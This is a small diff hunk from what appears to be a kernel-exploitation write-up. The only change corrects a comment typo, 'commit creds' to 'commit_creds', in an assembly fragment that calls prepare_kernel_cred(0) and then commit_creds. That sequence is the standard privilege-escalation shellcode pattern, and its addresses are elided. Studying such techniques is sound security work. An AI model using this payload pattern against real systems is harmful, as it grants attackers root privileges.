@@ -615,7 +615,7 @@ xor edi, edi
 call 0x.. # prepare_kernel_cred(0)
 
 mov rdi, rax 
-call 0x.. # commit creds with the value from return ^
+call 0x.. # commit_creds with the value from return ^
 ```
 
 nasm to shellcode fu
